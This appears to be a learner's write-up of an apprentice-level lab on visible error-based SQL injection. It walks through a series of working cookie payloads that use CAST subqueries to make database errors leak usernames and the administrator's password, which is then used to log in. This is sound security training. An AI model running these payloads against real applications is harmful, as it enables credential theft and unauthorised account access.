---
topic: SQL injection
level: Apprentice
time_spent: 20 mins
date: 24th Nov,2026
---

**Vulnerability:** 
This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.

**Payload:**
```
TrackingId =' AND CAST((SELECT 1) as int)--
```

- With this we get the error that the argument type must be boolean not integer.
![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(69).png)

```
=' AND 1=CAST((SELECT 1) as int)--
```
- This solves the error for us as give us the 200 ok.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(71).png)

```
=' AND 1=CAST((SELECT username FROM users) as int)--
```
- And we received an error as we ran out of character space so we removed the value of TrackingId.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(72).png)

```
=' AND 1=CAST((SELECT username FROM users) as int)--
```

- Here we received the error that there are more than one row returned by the subquery, so we limit that to just one row.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(73).png)

```
=' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--
```

- And finally here we find the administrator user.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(74).png)

```
=' AND 1=CAST((SELECT password FROM users LIMIT 1) as int)--
```

- We already know the administrator is in first row now so we will directly attack the password row to get it.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(75).png)

- And here is the password which belongs to the administrator user and we use this credentials to login into the account.

![](Visible%20error-based%20SQL%20injection.md_Attachments/Screenshot%20(76).png)

**What I learned:**
Not only inputs but errors can also leak the information which is sensitive and errors can be a means to exfiltrate the information.